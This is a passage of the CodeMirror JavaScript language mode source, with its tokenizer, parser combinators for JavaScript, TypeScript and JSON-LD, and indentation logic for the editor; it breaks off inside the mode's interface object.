// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("javascript", function(config, parserConfig) {
  var indentUnit = config.indentUnit;
  var statementIndent = parserConfig.statementIndent;
  var jsonldMode = parserConfig.jsonld;
  var jsonMode = parserConfig.json || jsonldMode;
  var isTS = parserConfig.typescript;
  var wordRE = parserConfig.wordCharacters || /[\w$\xa1-\uffff]/;

  // Tokenizer

  var keywords = function(){
    function kw(type) {return {type: type, style: "keyword"};}
    var A = kw("keyword a"), B = kw("keyword b"), C = kw("keyword c"), D = kw("keyword d");
    var operator = kw("operator"), atom = {type: "atom", style: "atom"};

    return {
      "if": kw("if"), "while": A, "with": A, "else": B, "do": B, "try": B, "finally": B,
      "return": D, "break": D, "continue": D, "new": kw("new"), "delete": C, "void": C, "throw": C,
      "debugger": kw("debugger"), "var": kw("var"), "const": kw("var"), "let": kw("var"),
      "function": kw("function"), "catch": kw("catch"),
      "for": kw("for"), "switch": kw("switch"), "case": kw("case"), "default": kw("default"),
      "in": operator, "typeof": operator, "instanceof": operator,
      "true": atom, "false": atom, "null": atom, "undefined": atom, "NaN": atom, "Infinity": atom,
      "this": kw("this"), "class": kw("class"), "super": kw("atom"),
      "yield": C, "export": kw("export"), "import": kw("import"), "extends": C,
      "await": C
    };
  }();

  var isOperatorChar = /[+\-*&%=<>!?|~^@]/;
  var isJsonldKeyword = /^@(context|id|value|language|type|container|list|set|reverse|index|base|vocab|graph)"/;

  function readRegexp(stream) {
    var escaped = false, next, inSet = false;
    while ((next = stream.next()) != null) {
      if (!escaped) {
        if (next == "/" && !inSet) return;
        if (next == "[") inSet = true;
        else if (inSet && next == "]") inSet = false;
      }
      escaped = !escaped && next == "\\";
    }
  }

  // Used as scratch variables to communicate multiple values without
  // consing up tons of objects.
  var type, content;
  function ret(tp, style, cont) {
    type = tp; content = cont;
    return style;
  }
  function tokenBase(stream, state) {
    var ch = stream.next();
    if (ch == '"' || ch == "'") {
      state.tokenize = tokenString(ch);
      return state.tokenize(stream, state);
    } else if (ch == "." && stream.match(/^\d[\d_]*(?:[eE][+\-]?[\d_]+)?/)) {
      return ret("number", "number");
    } else if (ch == "." && stream.match("..")) {
      return ret("spread", "meta");
    } else if (/[\[\]{}\(\),;\:\.]/.test(ch)) {
      return ret(ch);
    } else if (ch == "=" && stream.eat(">")) {
      return ret("=>", "operator");
    } else if (ch == "0" && stream.match(/^(?:x[\dA-Fa-f_]+|o[0-7_]+|b[01_]+)n?/)) {
      return ret("number", "number");
    } else if (/\d/.test(ch)) {
      stream.match(/^[\d_]*(?:n|(?:\.[\d_]*)?(?:[eE][+\-]?[\d_]+)?)?/);
      return ret("number", "number");
    } else if (ch == "/") {
      if (stream.eat("*")) {
        state.tokenize = tokenComment;
        return tokenComment(stream, state);
      } else if (stream.eat("/")) {
        stream.skipToEnd();
        return ret("comment", "comment");
      } else if (expressionAllowed(stream, state, 1)) {
        readRegexp(stream);
        stream.match(/^\b(([gimyus])(?![gimyus]*\2))+\b/);
        return ret("regexp", "string-2");
      } else {
        stream.eat("=");
        return ret("operator", "operator", stream.current());
      }
    } else if (ch == "`") {
      state.tokenize = tokenQuasi;
      return tokenQuasi(stream, state);
    } else if (ch == "#") {
      stream.skipToEnd();
      return ret("error", "error");
    } else if (ch == "<" && stream.match("!--") || ch == "-" && stream.match("->")) {
      stream.skipToEnd()
      return ret("comment", "comment")
    } else if (isOperatorChar.test(ch)) {
      if (ch != ">" || !state.lexical || state.lexical.type != ">") {
        if (stream.eat("=")) {
          if (ch == "!" || ch == "=") stream.eat("=")
        } else if (/[<>*+\-]/.test(ch)) {
          stream.eat(ch)
          if (ch == ">") stream.eat(ch)
        }
      }
      return ret("operator", "operator", stream.current());
    } else if (wordRE.test(ch)) {
      stream.eatWhile(wordRE);
      var word = stream.current()
      if (state.lastType != ".") {
        if (keywords.propertyIsEnumerable(word)) {
          var kw = keywords[word]
          return ret(kw.type, kw.style, word)
        }
        if (word == "async" && stream.match(/^(\s|\/\*.*?\*\/)*[\[\(\w]/, false))
          return ret("async", "keyword", word)
      }
      return ret("variable", "variable", word)
    }
  }

  function tokenString(quote) {
    return function(stream, state) {
      var escaped = false, next;
      if (jsonldMode && stream.peek() == "@" && stream.match(isJsonldKeyword)){
        state.tokenize = tokenBase;
        return ret("jsonld-keyword", "meta");
      }
      while ((next = stream.next()) != null) {
        if (next == quote && !escaped) break;
        escaped = !escaped && next == "\\";
      }
      if (!escaped) state.tokenize = tokenBase;
      return ret("string", "string");
    };
  }

  function tokenComment(stream, state) {
    var maybeEnd = false, ch;
    while (ch = stream.next()) {
      if (ch == "/" && maybeEnd) {
        state.tokenize = tokenBase;
        break;
      }
      maybeEnd = (ch == "*");
    }
    return ret("comment", "comment");
  }

  function tokenQuasi(stream, state) {
    var escaped = false, next;
    while ((next = stream.next()) != null) {
      if (!escaped && (next == "`" || next == "$" && stream.eat("{"))) {
        state.tokenize = tokenBase;
        break;
      }
      escaped = !escaped && next == "\\";
    }
    return ret("quasi", "string-2", stream.current());
  }

  var brackets = "([{}])";
  // This is a crude lookahead trick to try and notice that we're
  // parsing the argument patterns for a fat-arrow function before we
  // actually hit the arrow token. It only works if the arrow is on
  // the same line as the arguments and there's no strange noise
  // (comments) in between. Fallback is to only notice when we hit the
  // arrow, and not declare the arguments as locals for the arrow
  // body.
  function findFatArrow(stream, state) {
    if (state.fatArrowAt) state.fatArrowAt = null;
    var arrow = stream.string.indexOf("=>", stream.start);
    if (arrow < 0) return;

    if (isTS) { // Try to skip TypeScript return type declarations after the arguments
      var m = /:\s*(?:\w+(?:<[^>]*>|\[\])?|\{[^}]*\})\s*$/.exec(stream.string.slice(stream.start, arrow))
      if (m) arrow = m.index
    }

    var depth = 0, sawSomething = false;
    for (var pos = arrow - 1; pos >= 0; --pos) {
      var ch = stream.string.charAt(pos);
      var bracket = brackets.indexOf(ch);
      if (bracket >= 0 && bracket < 3) {
        if (!depth) { ++pos; break; }
        if (--depth == 0) { if (ch == "(") sawSomething = true; break; }
      } else if (bracket >= 3 && bracket < 6) {
        ++depth;
      } else if (wordRE.test(ch)) {
        sawSomething = true;
      } else if (/["'\/`]/.test(ch)) {
        for (;; --pos) {
          if (pos == 0) return
          var next = stream.string.charAt(pos - 1)
          if (next == ch && stream.string.charAt(pos - 2) != "\\") { pos--; break }
        }
      } else if (sawSomething && !depth) {
        ++pos;
        break;
      }
    }
    if (sawSomething && !depth) state.fatArrowAt = pos;
  }

  // Parser

  var atomicTypes = {"atom": true, "number": true, "variable": true, "string": true, "regexp": true, "this": true, "jsonld-keyword": true};

  function JSLexical(indented, column, type, align, prev, info) {
    this.indented = indented;
    this.column = column;
    this.type = type;
    this.prev = prev;
    this.info = info;
    if (align != null) this.align = align;
  }

  function inScope(state, varname) {
    for (var v = state.localVars; v; v = v.next)
      if (v.name == varname) return true;
    for (var cx = state.context; cx; cx = cx.prev) {
      for (var v = cx.vars; v; v = v.next)
        if (v.name == varname) return true;
    }
  }

  function parseJS(state, style, type, content, stream) {
    var cc = state.cc;
    // Communicate our context to the combinators.
    // (Less wasteful than consing up a hundred closures on every call.)
    cx.state = state; cx.stream = stream; cx.marked = null, cx.cc = cc; cx.style = style;

    if (!state.lexical.hasOwnProperty("align"))
      state.lexical.align = true;

    while(true) {
      var combinator = cc.length ? cc.pop() : jsonMode ? expression : statement;
      if (combinator(type, content)) {
        while(cc.length && cc[cc.length - 1].lex)
          cc.pop()();
        if (cx.marked) return cx.marked;
        if (type == "variable" && inScope(state, content)) return "variable-2";
        return style;
      }
    }
  }

  // Combinator utils

  var cx = {state: null, column: null, marked: null, cc: null};
  function pass() {
    for (var i = arguments.length - 1; i >= 0; i--) cx.cc.push(arguments[i]);
  }
  function cont() {
    pass.apply(null, arguments);
    return true;
  }
  function inList(name, list) {
    for (var v = list; v; v = v.next) if (v.name == name) return true
    return false;
  }
  function register(varname) {
    var state = cx.state;
    cx.marked = "def";
    if (state.context) {
      if (state.lexical.info == "var" && state.context && state.context.block) {
        // FIXME function decls are also not block scoped
        var newContext = registerVarScoped(varname, state.context)
        if (newContext != null) {
          state.context = newContext
          return
        }
      } else if (!inList(varname, state.localVars)) {
        state.localVars = new Var(varname, state.localVars)
        return
      }
    }
    // Fall through means this is global
    if (parserConfig.globalVars && !inList(varname, state.globalVars))
      state.globalVars = new Var(varname, state.globalVars)
  }
  function registerVarScoped(varname, context) {
    if (!context) {
      return null
    } else if (context.block) {
      var inner = registerVarScoped(varname, context.prev)
      if (!inner) return null
      if (inner == context.prev) return context
      return new Context(inner, context.vars, true)
    } else if (inList(varname, context.vars)) {
      return context
    } else {
      return new Context(context.prev, new Var(varname, context.vars), false)
    }
  }

  function isModifier(name) {
    return name == "public" || name == "private" || name == "protected" || name == "abstract" || name == "readonly"
  }

  // Combinators

  function Context(prev, vars, block) { this.prev = prev; this.vars = vars; this.block = block }
  function Var(name, next) { this.name = name; this.next = next }

  var defaultVars = new Var("this", new Var("arguments", null))
  function pushcontext() {
    cx.state.context = new Context(cx.state.context, cx.state.localVars, false)
    cx.state.localVars = defaultVars
  }
  function pushblockcontext() {
    cx.state.context = new Context(cx.state.context, cx.state.localVars, true)
    cx.state.localVars = null
  }
  function popcontext() {
    cx.state.localVars = cx.state.context.vars
    cx.state.context = cx.state.context.prev
  }
  popcontext.lex = true
  function pushlex(type, info) {
    var result = function() {
      var state = cx.state, indent = state.indented;
      if (state.lexical.type == "stat") indent = state.lexical.indented;
      else for (var outer = state.lexical; outer && outer.type == ")" && outer.align; outer = outer.prev)
        indent = outer.indented;
      state.lexical = new JSLexical(indent, cx.stream.column(), type, null, state.lexical, info);
    };
    result.lex = true;
    return result;
  }
  function poplex() {
    var state = cx.state;
    if (state.lexical.prev) {
      if (state.lexical.type == ")")
        state.indented = state.lexical.indented;
      state.lexical = state.lexical.prev;
    }
  }
  poplex.lex = true;

  function expect(wanted) {
    function exp(type) {
      if (type == wanted) return cont();
      else if (wanted == ";" || type == "}" || type == ")" || type == "]") return pass();
      else return cont(exp);
    };
    return exp;
  }

  function statement(type, value) {
    if (type == "var") return cont(pushlex("vardef", value), vardef, expect(";"), poplex);
    if (type == "keyword a") return cont(pushlex("form"), parenExpr, statement, poplex);
    if (type == "keyword b") return cont(pushlex("form"), statement, poplex);
    if (type == "keyword d") return cx.stream.match(/^\s*$/, false) ? cont() : cont(pushlex("stat"), maybeexpression, expect(";"), poplex);
    if (type == "debugger") return cont(expect(";"));
    if (type == "{") return cont(pushlex("}"), pushblockcontext, block, poplex, popcontext);
    if (type == ";") return cont();
    if (type == "if") {
      if (cx.state.lexical.info == "else" && cx.state.cc[cx.state.cc.length - 1] == poplex)
        cx.state.cc.pop()();
      return cont(pushlex("form"), parenExpr, statement, poplex, maybeelse);
    }
    if (type == "function") return cont(functiondef);
    if (type == "for") return cont(pushlex("form"), forspec, statement, poplex);
    if (type == "class" || (isTS && value == "interface")) {
      cx.marked = "keyword"
      return cont(pushlex("form", type == "class" ? type : value), className, poplex)
    }
    if (type == "variable") {
      if (isTS && value == "declare") {
        cx.marked = "keyword"
        return cont(statement)
      } else if (isTS && (value == "module" || value == "enum" || value == "type") && cx.stream.match(/^\s*\w/, false)) {
        cx.marked = "keyword"
        if (value == "enum") return cont(enumdef);
        else if (value == "type") return cont(typename, expect("operator"), typeexpr, expect(";"));
        else return cont(pushlex("form"), pattern, expect("{"), pushlex("}"), block, poplex, poplex)
      } else if (isTS && value == "namespace") {
        cx.marked = "keyword"
        return cont(pushlex("form"), expression, statement, poplex)
      } else if (isTS && value == "abstract") {
        cx.marked = "keyword"
        return cont(statement)
      } else {
        return cont(pushlex("stat"), maybelabel);
      }
    }
    if (type == "switch") return cont(pushlex("form"), parenExpr, expect("{"), pushlex("}", "switch"), pushblockcontext,
                                      block, poplex, poplex, popcontext);
    if (type == "case") return cont(expression, expect(":"));
    if (type == "default") return cont(expect(":"));
    if (type == "catch") return cont(pushlex("form"), pushcontext, maybeCatchBinding, statement, poplex, popcontext);
    if (type == "export") return cont(pushlex("stat"), afterExport, poplex);
    if (type == "import") return cont(pushlex("stat"), afterImport, poplex);
    if (type == "async") return cont(statement)
    if (value == "@") return cont(expression, statement)
    return pass(pushlex("stat"), expression, expect(";"), poplex);
  }
  function maybeCatchBinding(type) {
    if (type == "(") return cont(funarg, expect(")"))
  }
  function expression(type, value) {
    return expressionInner(type, value, false);
  }
  function expressionNoComma(type, value) {
    return expressionInner(type, value, true);
  }
  function parenExpr(type) {
    if (type != "(") return pass()
    return cont(pushlex(")"), expression, expect(")"), poplex)
  }
  function expressionInner(type, value, noComma) {
    if (cx.state.fatArrowAt == cx.stream.start) {
      var body = noComma ? arrowBodyNoComma : arrowBody;
      if (type == "(") return cont(pushcontext, pushlex(")"), commasep(funarg, ")"), poplex, expect("=>"), body, popcontext);
      else if (type == "variable") return pass(pushcontext, pattern, expect("=>"), body, popcontext);
    }

    var maybeop = noComma ? maybeoperatorNoComma : maybeoperatorComma;
    if (atomicTypes.hasOwnProperty(type)) return cont(maybeop);
    if (type == "function") return cont(functiondef, maybeop);
    if (type == "class" || (isTS && value == "interface")) { cx.marked = "keyword"; return cont(pushlex("form"), classExpression, poplex); }
    if (type == "keyword c" || type == "async") return cont(noComma ? expressionNoComma : expression);
    if (type == "(") return cont(pushlex(")"), maybeexpression, expect(")"), poplex, maybeop);
    if (type == "operator" || type == "spread") return cont(noComma ? expressionNoComma : expression);
    if (type == "[") return cont(pushlex("]"), arrayLiteral, poplex, maybeop);
    if (type == "{") return contCommasep(objprop, "}", null, maybeop);
    if (type == "quasi") return pass(quasi, maybeop);
    if (type == "new") return cont(maybeTarget(noComma));
    if (type == "import") return cont(expression);
    return cont();
  }
  function maybeexpression(type) {
    if (type.match(/[;\}\)\],]/)) return pass();
    return pass(expression);
  }

  function maybeoperatorComma(type, value) {
    if (type == ",") return cont(expression);
    return maybeoperatorNoComma(type, value, false);
  }
  function maybeoperatorNoComma(type, value, noComma) {
    var me = noComma == false ? maybeoperatorComma : maybeoperatorNoComma;
    var expr = noComma == false ? expression : expressionNoComma;
    if (type == "=>") return cont(pushcontext, noComma ? arrowBodyNoComma : arrowBody, popcontext);
    if (type == "operator") {
      if (/\+\+|--/.test(value) || isTS && value == "!") return cont(me);
      if (isTS && value == "<" && cx.stream.match(/^([^>]|<.*?>)*>\s*\(/, false))
        return cont(pushlex(">"), commasep(typeexpr, ">"), poplex, me);
      if (value == "?") return cont(expression, expect(":"), expr);
      return cont(expr);
    }
    if (type == "quasi") { return pass(quasi, me); }
    if (type == ";") return;
    if (type == "(") return contCommasep(expressionNoComma, ")", "call", me);
    if (type == ".") return cont(property, me);
    if (type == "[") return cont(pushlex("]"), maybeexpression, expect("]"), poplex, me);
    if (isTS && value == "as") { cx.marked = "keyword"; return cont(typeexpr, me) }
    if (type == "regexp") {
      cx.state.lastType = cx.marked = "operator"
      cx.stream.backUp(cx.stream.pos - cx.stream.start - 1)
      return cont(expr)
    }
  }
  function quasi(type, value) {
    if (type != "quasi") return pass();
    if (value.slice(value.length - 2) != "${") return cont(quasi);
    return cont(expression, continueQuasi);
  }
  function continueQuasi(type) {
    if (type == "}") {
      cx.marked = "string-2";
      cx.state.tokenize = tokenQuasi;
      return cont(quasi);
    }
  }
  function arrowBody(type) {
    findFatArrow(cx.stream, cx.state);
    return pass(type == "{" ? statement : expression);
  }
  function arrowBodyNoComma(type) {
    findFatArrow(cx.stream, cx.state);
    return pass(type == "{" ? statement : expressionNoComma);
  }
  function maybeTarget(noComma) {
    return function(type) {
      if (type == ".") return cont(noComma ? targetNoComma : target);
      else if (type == "variable" && isTS) return cont(maybeTypeArgs, noComma ? maybeoperatorNoComma : maybeoperatorComma)
      else return pass(noComma ? expressionNoComma : expression);
    };
  }
  function target(_, value) {
    if (value == "target") { cx.marked = "keyword"; return cont(maybeoperatorComma); }
  }
  function targetNoComma(_, value) {
    if (value == "target") { cx.marked = "keyword"; return cont(maybeoperatorNoComma); }
  }
  function maybelabel(type) {
    if (type == ":") return cont(poplex, statement);
    return pass(maybeoperatorComma, expect(";"), poplex);
  }
  function property(type) {
    if (type == "variable") {cx.marked = "property"; return cont();}
  }
  function objprop(type, value) {
    if (type == "async") {
      cx.marked = "property";
      return cont(objprop);
    } else if (type == "variable" || cx.style == "keyword") {
      cx.marked = "property";
      if (value == "get" || value == "set") return cont(getterSetter);
      var m // Work around fat-arrow-detection complication for detecting typescript typed arrow params
      if (isTS && cx.state.fatArrowAt == cx.stream.start && (m = cx.stream.match(/^\s*:\s*/, false)))
        cx.state.fatArrowAt = cx.stream.pos + m[0].length
      return cont(afterprop);
    } else if (type == "number" || type == "string") {
      cx.marked = jsonldMode ? "property" : (cx.style + " property");
      return cont(afterprop);
    } else if (type == "jsonld-keyword") {
      return cont(afterprop);
    } else if (isTS && isModifier(value)) {
      cx.marked = "keyword"
      return cont(objprop)
    } else if (type == "[") {
      return cont(expression, maybetype, expect("]"), afterprop);
    } else if (type == "spread") {
      return cont(expressionNoComma, afterprop);
    } else if (value == "*") {
      cx.marked = "keyword";
      return cont(objprop);
    } else if (type == ":") {
      return pass(afterprop)
    }
  }
  function getterSetter(type) {
    if (type != "variable") return pass(afterprop);
    cx.marked = "property";
    return cont(functiondef);
  }
  function afterprop(type) {
    if (type == ":") return cont(expressionNoComma);
    if (type == "(") return pass(functiondef);
  }
  function commasep(what, end, sep) {
    function proceed(type, value) {
      if (sep ? sep.indexOf(type) > -1 : type == ",") {
        var lex = cx.state.lexical;
        if (lex.info == "call") lex.pos = (lex.pos || 0) + 1;
        return cont(function(type, value) {
          if (type == end || value == end) return pass()
          return pass(what)
        }, proceed);
      }
      if (type == end || value == end) return cont();
      if (sep && sep.indexOf(";") > -1) return pass(what)
      return cont(expect(end));
    }
    return function(type, value) {
      if (type == end || value == end) return cont();
      return pass(what, proceed);
    };
  }
  function contCommasep(what, end, info) {
    for (var i = 3; i < arguments.length; i++)
      cx.cc.push(arguments[i]);
    return cont(pushlex(end, info), commasep(what, end), poplex);
  }
  function block(type) {
    if (type == "}") return cont();
    return pass(statement, block);
  }
  function maybetype(type, value) {
    if (isTS) {
      if (type == ":") return cont(typeexpr);
      if (value == "?") return cont(maybetype);
    }
  }
  function maybetypeOrIn(type, value) {
    if (isTS && (type == ":" || value == "in")) return cont(typeexpr)
  }
  function mayberettype(type) {
    if (isTS && type == ":") {
      if (cx.stream.match(/^\s*\w+\s+is\b/, false)) return cont(expression, isKW, typeexpr)
      else return cont(typeexpr)
    }
  }
  function isKW(_, value) {
    if (value == "is") {
      cx.marked = "keyword"
      return cont()
    }
  }
  function typeexpr(type, value) {
    if (value == "keyof" || value == "typeof" || value == "infer") {
      cx.marked = "keyword"
      return cont(value == "typeof" ? expressionNoComma : typeexpr)
    }
    if (type == "variable" || value == "void") {
      cx.marked = "type"
      return cont(afterType)
    }
    if (value == "|" || value == "&") return cont(typeexpr)
    if (type == "string" || type == "number" || type == "atom") return cont(afterType);
    if (type == "[") return cont(pushlex("]"), commasep(typeexpr, "]", ","), poplex, afterType)
    if (type == "{") return cont(pushlex("}"), commasep(typeprop, "}", ",;"), poplex, afterType)
    if (type == "(") return cont(commasep(typearg, ")"), maybeReturnType, afterType)
    if (type == "<") return cont(commasep(typeexpr, ">"), typeexpr)
  }
  function maybeReturnType(type) {
    if (type == "=>") return cont(typeexpr)
  }
  function typeprop(type, value) {
    if (type == "variable" || cx.style == "keyword") {
      cx.marked = "property"
      return cont(typeprop)
    } else if (value == "?" || type == "number" || type == "string") {
      return cont(typeprop)
    } else if (type == ":") {
      return cont(typeexpr)
    } else if (type == "[") {
      return cont(expect("variable"), maybetypeOrIn, expect("]"), typeprop)
    } else if (type == "(") {
      return pass(functiondecl, typeprop)
    }
  }
  function typearg(type, value) {
    if (type == "variable" && cx.stream.match(/^\s*[?:]/, false) || value == "?") return cont(typearg)
    if (type == ":") return cont(typeexpr)
    if (type == "spread") return cont(typearg)
    return pass(typeexpr)
  }
  function afterType(type, value) {
    if (value == "<") return cont(pushlex(">"), commasep(typeexpr, ">"), poplex, afterType)
    if (value == "|" || type == "." || value == "&") return cont(typeexpr)
    if (type == "[") return cont(typeexpr, expect("]"), afterType)
    if (value == "extends" || value == "implements") { cx.marked = "keyword"; return cont(typeexpr) }
    if (value == "?") return cont(typeexpr, expect(":"), typeexpr)
  }
  function maybeTypeArgs(_, value) {
    if (value == "<") return cont(pushlex(">"), commasep(typeexpr, ">"), poplex, afterType)
  }
  function typeparam() {
    return pass(typeexpr, maybeTypeDefault)
  }
  function maybeTypeDefault(_, value) {
    if (value == "=") return cont(typeexpr)
  }
  function vardef(_, value) {
    if (value == "enum") {cx.marked = "keyword"; return cont(enumdef)}
    return pass(pattern, maybetype, maybeAssign, vardefCont);
  }
  function pattern(type, value) {
    if (isTS && isModifier(value)) { cx.marked = "keyword"; return cont(pattern) }
    if (type == "variable") { register(value); return cont(); }
    if (type == "spread") return cont(pattern);
    if (type == "[") return contCommasep(eltpattern, "]");
    if (type == "{") return contCommasep(proppattern, "}");
  }
  function proppattern(type, value) {
    if (type == "variable" && !cx.stream.match(/^\s*:/, false)) {
      register(value);
      return cont(maybeAssign);
    }
    if (type == "variable") cx.marked = "property";
    if (type == "spread") return cont(pattern);
    if (type == "}") return pass();
    if (type == "[") return cont(expression, expect(']'), expect(':'), proppattern);
    return cont(expect(":"), pattern, maybeAssign);
  }
  function eltpattern() {
    return pass(pattern, maybeAssign)
  }
  function maybeAssign(_type, value) {
    if (value == "=") return cont(expressionNoComma);
  }
  function vardefCont(type) {
    if (type == ",") return cont(vardef);
  }
  function maybeelse(type, value) {
    if (type == "keyword b" && value == "else") return cont(pushlex("form", "else"), statement, poplex);
  }
  function forspec(type, value) {
    if (value == "await") return cont(forspec);
    if (type == "(") return cont(pushlex(")"), forspec1, poplex);
  }
  function forspec1(type) {
    if (type == "var") return cont(vardef, forspec2);
    if (type == "variable") return cont(forspec2);
    return pass(forspec2)
  }
  function forspec2(type, value) {
    if (type == ")") return cont()
    if (type == ";") return cont(forspec2)
    if (value == "in" || value == "of") { cx.marked = "keyword"; return cont(expression, forspec2) }
    return pass(expression, forspec2)
  }
  function functiondef(type, value) {
    if (value == "*") {cx.marked = "keyword"; return cont(functiondef);}
    if (type == "variable") {register(value); return cont(functiondef);}
    if (type == "(") return cont(pushcontext, pushlex(")"), commasep(funarg, ")"), poplex, mayberettype, statement, popcontext);
    if (isTS && value == "<") return cont(pushlex(">"), commasep(typeparam, ">"), poplex, functiondef)
  }
  function functiondecl(type, value) {
    if (value == "*") {cx.marked = "keyword"; return cont(functiondecl);}
    if (type == "variable") {register(value); return cont(functiondecl);}
    if (type == "(") return cont(pushcontext, pushlex(")"), commasep(funarg, ")"), poplex, mayberettype, popcontext);
    if (isTS && value == "<") return cont(pushlex(">"), commasep(typeparam, ">"), poplex, functiondecl)
  }
  function typename(type, value) {
    if (type == "keyword" || type == "variable") {
      cx.marked = "type"
      return cont(typename)
    } else if (value == "<") {
      return cont(pushlex(">"), commasep(typeparam, ">"), poplex)
    }
  }
  function funarg(type, value) {
    if (value == "@") cont(expression, funarg)
    if (type == "spread") return cont(funarg);
    if (isTS && isModifier(value)) { cx.marked = "keyword"; return cont(funarg); }
    if (isTS && type == "this") return cont(maybetype, maybeAssign)
    return pass(pattern, maybetype, maybeAssign);
  }
  function classExpression(type, value) {
    // Class expressions may have an optional name.
    if (type == "variable") return className(type, value);
    return classNameAfter(type, value);
  }
  function className(type, value) {
    if (type == "variable") {register(value); return cont(classNameAfter);}
  }
  function classNameAfter(type, value) {
    if (value == "<") return cont(pushlex(">"), commasep(typeparam, ">"), poplex, classNameAfter)
    if (value == "extends" || value == "implements" || (isTS && type == ",")) {
      if (value == "implements") cx.marked = "keyword";
      return cont(isTS ? typeexpr : expression, classNameAfter);
    }
    if (type == "{") return cont(pushlex("}"), classBody, poplex);
  }
  function classBody(type, value) {
    if (type == "async" ||
        (type == "variable" &&
         (value == "static" || value == "get" || value == "set" || (isTS && isModifier(value))) &&
         cx.stream.match(/^\s+[\w$\xa1-\uffff]/, false))) {
      cx.marked = "keyword";
      return cont(classBody);
    }
    if (type == "variable" || cx.style == "keyword") {
      cx.marked = "property";
      return cont(isTS ? classfield : functiondef, classBody);
    }
    if (type == "number" || type == "string") return cont(isTS ? classfield : functiondef, classBody);
    if (type == "[")
      return cont(expression, maybetype, expect("]"), isTS ? classfield : functiondef, classBody)
    if (value == "*") {
      cx.marked = "keyword";
      return cont(classBody);
    }
    if (isTS && type == "(") return pass(functiondecl, classBody)
    if (type == ";" || type == ",") return cont(classBody);
    if (type == "}") return cont();
    if (value == "@") return cont(expression, classBody)
  }
  function classfield(type, value) {
    if (value == "?") return cont(classfield)
    if (type == ":") return cont(typeexpr, maybeAssign)
    if (value == "=") return cont(expressionNoComma)
    var context = cx.state.lexical.prev, isInterface = context && context.info == "interface"
    return pass(isInterface ? functiondecl : functiondef)
  }
  function afterExport(type, value) {
    if (value == "*") { cx.marked = "keyword"; return cont(maybeFrom, expect(";")); }
    if (value == "default") { cx.marked = "keyword"; return cont(expression, expect(";")); }
    if (type == "{") return cont(commasep(exportField, "}"), maybeFrom, expect(";"));
    return pass(statement);
  }
  function exportField(type, value) {
    if (value == "as") { cx.marked = "keyword"; return cont(expect("variable")); }
    if (type == "variable") return pass(expressionNoComma, exportField);
  }
  function afterImport(type) {
    if (type == "string") return cont();
    if (type == "(") return pass(expression);
    return pass(importSpec, maybeMoreImports, maybeFrom);
  }
  function importSpec(type, value) {
    if (type == "{") return contCommasep(importSpec, "}");
    if (type == "variable") register(value);
    if (value == "*") cx.marked = "keyword";
    return cont(maybeAs);
  }
  function maybeMoreImports(type) {
    if (type == ",") return cont(importSpec, maybeMoreImports)
  }
  function maybeAs(_type, value) {
    if (value == "as") { cx.marked = "keyword"; return cont(importSpec); }
  }
  function maybeFrom(_type, value) {
    if (value == "from") { cx.marked = "keyword"; return cont(expression); }
  }
  function arrayLiteral(type) {
    if (type == "]") return cont();
    return pass(commasep(expressionNoComma, "]"));
  }
  function enumdef() {
    return pass(pushlex("form"), pattern, expect("{"), pushlex("}"), commasep(enummember, "}"), poplex, poplex)
  }
  function enummember() {
    return pass(pattern, maybeAssign);
  }

  function isContinuedStatement(state, textAfter) {
    return state.lastType == "operator" || state.lastType == "," ||
      isOperatorChar.test(textAfter.charAt(0)) ||
      /[,.]/.test(textAfter.charAt(0));
  }

  function expressionAllowed(stream, state, backUp) {
    return state.tokenize == tokenBase &&
      /^(?:operator|sof|keyword [bcd]|case|new|export|default|spread|[\[{}\(,;:]|=>)$/.test(state.lastType) ||
      (state.lastType == "quasi" && /\{\s*$/.test(stream.string.slice(0, stream.pos - (backUp || 0))))
  }

  // Interface

  return {
    startState: function(basecolumn) {
      var state = {
        tokenize: tokenBase,
        lastType: "sof",
        cc: [],
        lexical: new JSLexical((basecolumn || 0) - indentUnit, 0, "block", false),
        localVars: parserConfig.localVars,
        context: parserConfig.localVars && new Context(null, null, false),
        indented: basecolumn || 0
      };
      if (parserConfig.globalVars && typeof parserConfig.globalVars == "object")
        state.globalVars = parserConfig.globalVars;
      return state;
    },

    token: function(stream, state) {
      if (stream.sol()) {
        if (!state.lexical.hasOwnProperty("align"))
          state.lexical.align = false;
        state.indented = stream.indentation();
        findFatArrow(stream, state);
      }
      if (state.tokenize != tokenComment && stream.eatSpace()) return null;
      var style = state.tokenize(stream, state);
      if (type == "comment") return style;
      state.lastType = type == "operator" && (content == "++" || content == "--") ? "incdec" : type;
      return parseJS(state, style, type, content, stream);
    },

    indent: function(state, textAfter) {
      if (state.tokenize == tokenComment) return CodeMirror.Pass;
      if (state.tokenize != tokenBase) return 0;
      var firstChar = textAfter && textAfter.charAt(0), lexical = state.lexical, top
      // Kludge to prevent 'maybelse' from blocking lexical scope pops
      if (!/^\s*else\b/.test(textAfter)) for (var i = state.cc.length - 1; i >= 0; --i) {
        var c = state.cc[i];
        if (c == poplex) lexical = lexical.prev;
        else if (c != maybeelse) break;
      }
      while ((lexical.type == "stat" || lexical.type == "form") &&
             (firstChar == "}" || ((top = state.cc[state.cc.length - 1]) &&
                                   (top == maybeoperatorComma || top == maybeoperatorNoComma) &&
                                   !/^[,\.=+\-*:?[\(]/.test(textAfter))))
        lexical = lexical.prev;
      if (statementIndent && lexical.type == ")" && lexical.prev.type == "stat")
        lexical = lexical.prev;
      var type = lexical.type, closing = firstChar == type;

      if (type == "vardef") return lexical.indented + (state.lastType == "operator" || state.lastType == "," ? lexical.info.length + 1 : 0);
      else if (type == "form" && firstChar == "{") return lexical.indented;
      else if (type == "form") return lexical.indented + indentUnit;
      else if (type == "stat")
        return lexical.indented + (isContinuedStatement(state, textAfter) ? statementIndent || indentUnit : 0);
      else if (lexical.info == "switch" && !closing && parserConfig.doubleIndentSwitch != false)
        return lexical.indented + (/^(?:case|default)\b/.test(textAfter) ? indentUnit : 2 * indentUnit);
      else if (lexical.align) return lexical.column + (closing ? 0 : 1);
      else return lexical.indented + (closing ? 0 : indentUnit);
    },

    electricInput: /^\s*(?:case .*?:|default:|\{|\})$/,
    blockCommentStart: jsonMode ? null : "/*",
    blockCommentEnd: jsonMode ? null : "*/",
    blockCommentContinue: jsonMode ? null : " * ",
    lineComment: jsonMode ? null : "//",
    fold: "brace",
    closeBrackets: "()[]{}''\"\"``",

